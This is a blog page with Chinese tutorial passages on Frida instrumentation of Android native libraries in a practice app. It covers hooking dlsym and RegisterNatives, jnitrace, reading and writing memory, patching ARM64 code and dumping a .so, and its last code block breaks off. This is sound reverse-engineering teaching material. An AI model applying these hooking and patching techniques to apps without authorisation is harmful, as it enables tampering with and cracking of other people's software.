<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dlsymAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;dlsym&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlsymAddr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">args1</span> = args[<span class="number">1</span>];</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(retval);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">module</span> == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">args1</span>.<span class="title function_">readCString</span>(), <span class="variable language_">module</span>.<span class="property">name</span>, retval, retval.<span class="title function_">sub</span>(<span class="variable language_">module</span>.<span class="property">base</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//Java_com_xiaojianbang_ndk_NativeHelper_add 0x75072acacc单击cadd</span></span><br><span class="line"><span class="comment">//Java_com_xiaojianbang_ndk_NativeHelper_md5 0x75072acf2c单机cmd5</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过测试发现，上面那两条信息只能输出一次，就是在那两个按钮在被初次点击的时候。因为静态注册的native函数首次被调用才会经过dlsym函数，之后就不再触发。</p>
<p>而在jni动态注册中，在系统加载完so文件后，才去获取JNI_Onload函数地址，使用的也是dlsym</p>
<h3 id="Hook-RegisterNatives获取函数地址"><a href="#Hook-RegisterNatives获取函数地址" class="headerlink" title="Hook RegisterNatives获取函数地址"></a>Hook RegisterNatives获取函数地址</h3><p>RegisterNatives定义在libart.so中，可以通过枚举符号来获取地址。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">RegisterNativesAddr</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> _symbols = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title function_">enumerateSymbols</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; _symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> _symbol = _symbols[i];</span><br><span class="line">    <span class="keyword">if</span> (_symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; _symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title class_">RegisterNativesAddr</span> = _symbols[i].<span class="property">address</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">RegisterNativesAddr</span>);</span><br></pre></td></tr></table></figure>

<p>RegisterNatives在jni.h,我觉得已经不用再看了，就是一个结构体，其成员：第0个是在函数java层的名字，第二个是签名，第三个是函数在cpp文件中的指针一般为(void <em>)开头，参数的话有四个JNIEnv * ,jcalss,JNINativeMethod</em> ,jint</p>
<p>Hook代码如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">RegisterNativesAddr</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> _symbols = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title function_">enumerateSymbols</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; _symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> _symbol = _symbols[i];</span><br><span class="line">    <span class="keyword">if</span> (_symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; _symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title class_">RegisterNativesAddr</span> = _symbols[i].<span class="property">address</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">RegisterNativesAddr</span>, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">        <span class="keyword">var</span> className = env.<span class="title function_">getClassName</span>(args[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">var</span> methodCount = args[<span class="number">3</span>].<span class="title function_">toInt32</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; methodCount; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = args[<span class="number">2</span>].<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">3</span> * i)</span><br><span class="line">.<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">var</span> signature = args[<span class="number">2</span>].<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">3</span> * i)</span><br><span class="line">.<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">var</span> fnPtr = args[<span class="number">2</span>].<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">3</span> * i)</span><br><span class="line">.<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">2</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">            <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(fnPtr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(className, methodName, signature, fnPtr, <span class="variable language_">module</span>.<span class="property">name</span>, fnPtr.<span class="title function_">sub</span>(<span class="variable language_">module</span>.<span class="property">base</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这里JNINativeMethod是一个结构体数组，每个成员占3个指针长度，在不知道有多少个成员的情况下，使用循环进行遍历，没循环一次，再偏移3个指针长度。</p>
<h3 id="jnitrace使用"><a href="#jnitrace使用" class="headerlink" title="jnitrace使用"></a>jnitrace使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnitrace -m attach - xxxx.so com.xxxxx.xxxxx //包名以frida-ps -U显示的为优先</span><br></pre></td></tr></table></figure>

<p>-l xxx.so用于指定要跟踪的库，此参数可多次使用，或用*来跟踪所有库</p>
<p>e.g:-l <a target="_blank" rel="noopener" href="http://libnativ-lib.so/">libnativ-lib.so</a> -l <a target="_blank" rel="noopener" href="http://libanother-lib.so/">libanother-lib.so</a> 或-l *</p>
<p>貌似遇到有壳的就不弹信息了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2022/10/27/Frida%20so%E5%B1%82%E8%BF%9B%E9%98%B6%E5%BA%94%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/27/Frida%20so%E5%B1%82%E8%BF%9B%E9%98%B6%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">Frida so层进阶应用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-27 18:27:12" itemprop="dateCreated datePublished" datetime="2022-10-27T18:27:12+08:00">2022-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-14 23:23:22" itemprop="dateModified" datetime="2025-10-14T23:23:22+08:00">2025-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Frida-so层进阶应用"><a href="#Frida-so层进阶应用" class="headerlink" title="Frida so层进阶应用"></a>Frida so层进阶应用</h1><p><strong>示例应用的so文件加载时机是在一些按钮被点击后才加载，注意</strong></p>
<h3 id="内存读写"><a href="#内存读写" class="headerlink" title="内存读写"></a>内存读写</h3><p>内存页是分权限的，权限通常用rwx来表示，r-可读，w-可写，x-可执行</p>
<p>报错acess violation即为非法访问</p>
<p>先来看看Memory的protect方法的源码</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type <span class="title class_">PageProtection</span> = string;</span><br><span class="line">declare namespace <span class="title class_">Memory</span> &#123;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">protect</span>(<span class="params">address: NativePointerValue, size: number | UInt64, protection: PageProtection</span>): boolean;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>对指定内存修改权限</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x3DED</span>), <span class="number">16</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ol>
<li>读取指定地址的字符串</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x3DED</span>).<span class="title function_">readCString</span>());</span><br></pre></td></tr></table></figure>

<ol>
<li>导出指定地址的内存数据</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x3DED</span>)));</span><br></pre></td></tr></table></figure>

<ol>
<li>读取指定地址的内存数据</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x3DED</span>).<span class="title function_">readByteArray</span>(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>

<ol>
<li><p>写入数据到指定内存地址</p>
<p> 在计算出指定的内存地址后，可以使用NativePointer的writeByteArray方法，从该地址往后写入数据，源码声明如下</p>
</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">class</span> <span class="title class_">NativePointer</span> &#123;</span><br><span class="line">	<span class="title function_">writeByteArray</span>(<span class="attr">value</span>: <span class="title class_">ArrayBuffer</span> | number[]): <span class="title class_">NativePointer</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>writeByteArray接受一个参数，ArrayBuffer或者是数值数组(想要写入的字节数组)。先来几个转换进制的工具函数。这些就单独放吧</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将字符串转为字节数组</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToBytes</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">hexToBytes</span>(<span class="title function_">stringToHex</span>(str));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将字符串进行hex编码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToHex</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> str.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">c</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;0&quot;</span> + c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>).<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">slice</span>(-<span class="number">2</span>);</span><br><span class="line">    &#125;).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将hex编码的数据转为字节数组</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">hex</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> bytes = [], c = <span class="number">0</span>; c &lt; hex.<span class="property">length</span>; c += <span class="number">2</span>)</span><br><span class="line">        bytes.<span class="title function_">push</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(c, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将hex编码的数据转为字符串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToString</span>(<span class="params">hexStr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> hex = hexStr.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; hex.<span class="property">length</span>; i += <span class="number">2</span>)</span><br><span class="line">        str += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写入字符串(跟上面的一起食用)</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> tmpAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x3DED</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(tmpAddr, <span class="number">16</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>( tmpAddr.<span class="title function_">writeByteArray</span>(<span class="title function_">stringToBytes</span>(<span class="string">&quot;xiaojianbang\0&quot;</span>)) ));</span><br></pre></td></tr></table></figure>

<ol>
<li>分配内存</li>
</ol>
<p>Memory方法的alloc的源码声明如下</p>
<p>alloc会在Frida私有堆上分配指定大小的内存，返回NativePointer类型的首地址，接着用NativePointer类的writeByteArray方法写入内存即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> namespace Memory &#123;</span><br><span class="line">	<span class="keyword">function</span> alloc(size: number | UInt64, options?: MemoryAllocOptions): NativePointer;</span><br><span class="line">	<span class="keyword">function</span> allocUtf8String(str: string): NativePointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>e.g.:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> addr = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">8</span>);</span><br><span class="line">addr.<span class="title function_">writeByteArray</span>(<span class="title function_">hexToBytes</span>(<span class="string">&quot;eeeeeeeeeeeeeeee&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(addr.<span class="title function_">readByteArray</span>(<span class="number">8</span>));</span><br></pre></td></tr></table></figure>

<h3 id="Frida修改so函数代码"><a href="#Frida修改so函数代码" class="headerlink" title="Frida修改so函数代码"></a>Frida修改so函数代码</h3><p>首先是Instruction的parse方法，可以将16进制转化为汇编代码，该方法参数仅有一个，即NativePointer类型的地址</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> funcAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1ACC</span>);</span><br><span class="line"><span class="keyword">var</span> asm = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(funcAddr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(asm);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    asm = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(asm.<span class="property">next</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(asm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">sub sp, sp, #0x20</span></span><br><span class="line"><span class="comment">str x0, [sp, #0x18]</span></span><br><span class="line"><span class="comment">str x1, [sp, #0x10]</span></span><br><span class="line"><span class="comment">str w2, [sp, #0xc]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<p>opcode与arm汇编的转换网址</p>
<p><a target="_blank" rel="noopener" href="https://armconverter.com/">https://armconverter.com/</a></p>
<p>修改代码需要写入的是opcode，并且需要用到上面的向指定内存中地址写入数据的方式。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">soAddr.<span class="title function_">add</span>(<span class="number">0x1AF4</span>).<span class="title function_">writeByteArray</span>(<span class="title function_">hexToBytes</span>(<span class="string">&quot;0001094B&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x1AF4</span>)));</span><br><span class="line"><span class="comment">// sub w0, w8, w9</span></span><br></pre></td></tr></table></figure>

<p>另一种方式是利用frida的api-ArmWriter</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x1AEC</span>)).<span class="title function_">putNop</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x1AEC</span>)).<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">// nop</span></span><br></pre></td></tr></table></figure>

<p>再或者说是patchCode，它的第0个参数是修改的其实地址，第一个参数是要修改的字节数，第二个参数是回调函数，当函数执行到起始地址是，会调用回调函数</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> codeAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1AF4</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(codeAddr, <span class="number">4</span>, <span class="keyword">function</span> (<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: codeAddr &#125;);</span><br><span class="line">    writer.<span class="title function_">putBytes</span>(<span class="title function_">hexToBytes</span>(<span class="string">&quot;0001094B&quot;</span>));   </span><br><span class="line">    writer.<span class="title function_">flush</span>();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(codeAddr));</span><br><span class="line"><span class="comment">//sub w0, w8, w9</span></span><br></pre></td></tr></table></figure>

<p>Frida在进行so层hook是，需要修改函数的前16个字节，这也是函数被Hook的检测点之一</p>
<p>示例如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MD5Final</span> = soAddr.<span class="title function_">add</span>(<span class="number">0x3A78</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title class_">MD5Final</span>.<span class="title function_">readByteArray</span>(<span class="number">20</span>)));</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">MD5Final</span>, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title class_">MD5Final</span>.<span class="title function_">readByteArray</span>(<span class="number">20</span>)));</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_func</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">00000000  ff 43 01 d1 fd 7b 04 a9 fd 03 01 91 48 d0 3b d5  .C...&#123;......H.;.</span></span><br><span class="line"><span class="comment">00000010  08 15 40 f9                                      ..@.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">00000000  50 00 00 58 00 02 1f d6 00 96 33 3e 74 00 00 00  P..X......3&gt;t...</span></span><br><span class="line"><span class="comment">00000010  08 15 40 f9                                      ..@.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="Frida从内存中导出so函数"><a href="#Frida从内存中导出so函数" class="headerlink" title="Frida从内存中导出so函数"></a>Frida从内存中导出so函数</h3><p>通过传入模块名，找到对应的Module，得到模块基址，模块大小等必要信息，然后保存生成路径，可能由于目标APP的权限影响，最好把路径设在APP本身的私有目录，防止保存失败。然后用Memory.protect修改内存权限，再使用NativePointer的readByteArray方法读取整个so文件对应的内存数据。最后使用Frida的API将文件写出</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dump_so</span>(<span class="params">so_name</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(so_name);</span><br><span 